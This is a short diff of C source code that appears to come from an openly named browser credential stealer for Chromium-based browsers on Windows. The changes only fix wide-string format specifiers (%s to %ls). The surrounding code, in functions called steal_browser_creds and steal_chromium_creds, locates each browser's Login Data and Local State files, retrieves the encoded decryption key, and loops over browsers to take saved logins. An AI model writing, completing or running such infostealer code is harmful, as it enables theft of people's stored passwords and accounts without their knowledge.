@@ -229,12 +229,12 @@ static int steal_browser_creds(BrowserInfo browser) {
   PWSTR loginDataPath;
   if (get_logindata_path(browser.loginDataPath, &loginDataPath) !=
       EXIT_SUCCESS) {
-    fwprintf(stderr, L"Unable to get login data PATH for %s\n",
+    fwprintf(stderr, L"Unable to get login data PATH for %ls\n",
              browser.browserName);
     return EXIT_FAILURE;
   }
 
-  wprintf(L"=== Now stealing %s credentials ===\n", browser.browserName);
+  wprintf(L"=== Now stealing %ls credentials ===\n", browser.browserName);
 
   Login *logins = NULL;
   int loginsCount = 0;
@@ -249,14 +249,14 @@ static int steal_browser_creds(BrowserInfo browser) {
   PWSTR localStatePath;
   if (get_localstate_path(browser.localStatePath, &localStatePath) !=
       EXIT_SUCCESS) {
-    fwprintf(stderr, L"Unable to get local state PATH for %s\n",
+    fwprintf(stderr, L"Unable to get local state PATH for %ls\n",
              browser.browserName);
     return EXIT_FAILURE;
   }
 
   PSTR encodedKey;
   if (retrieve_encoded_key(localStatePath, &encodedKey) != EXIT_SUCCESS) {
-    wprintf(L"Could not retrieve key from %s\n", localStatePath);
+    wprintf(L"Could not retrieve key from %ls\n", localStatePath);
     return EXIT_FAILURE;
   }
 
@@ -302,7 +302,7 @@ static int steal_browser_creds(BrowserInfo browser) {
 int steal_chromium_creds() {
   for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
     if (steal_browser_creds(browsers[i]) != EXIT_SUCCESS) {
-      fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n",
+      fwprintf(stderr, L"Unable to find credentials for %ls. Continuing...\n",
                browsers[i].browserName);
     }
   }
